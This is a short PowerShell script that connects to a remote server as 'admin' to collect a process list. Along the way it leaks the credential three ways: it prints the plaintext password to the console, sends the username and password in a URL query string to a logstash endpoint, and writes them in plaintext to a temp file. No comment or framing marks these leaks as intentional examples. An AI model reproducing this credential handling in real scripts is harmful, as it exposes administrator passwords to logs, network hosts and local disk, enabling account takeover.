$remoteHost = "server01.domain.local"
$username = "admin"
$password = "##wmi.pass##"

$session = New-PSSession -ComputerName $remoteHost -Credential (New-Object PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force)))

Write-Host "Connecting to $remoteHost as $username with password $password"

Invoke-Command -Session $session -ScriptBlock { Get-Process } > "C:\logs\process_$remoteHost.txt"

Invoke-WebRequest -Uri "https://logstash.company.com/ingest?u=$username&p=$password"

Set-Content -Path "C:\temp\session_info.txt" -Value "User=$username Password=$password Host=$remoteHost"

Remove-PSSession -Session $session
